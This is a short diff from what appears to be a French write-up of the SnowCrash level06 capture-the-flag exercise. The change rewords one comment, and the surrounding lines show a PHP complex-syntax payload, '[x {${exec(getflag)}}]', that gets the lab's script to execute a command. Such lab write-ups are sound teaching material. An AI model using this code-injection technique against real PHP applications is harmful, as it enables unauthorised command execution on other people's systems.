@@ -21,8 +21,7 @@ level06@SnowCrash:~$ ./level06 /tmp/script
 exec(getflag)
 
 [x exec(getflag)] ne fonctionne pas, nous avons seulement l'echo du contenu
-il va falloir utiliser la syntaxe complexe de php, qui nous permettra d'envoyer
-d'executer cela.
+il va falloir utiliser la syntaxe complexe de php qui nous permettra d'executer.
 
 level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/script
 level06@SnowCrash:~$ ./level06 /tmp/script
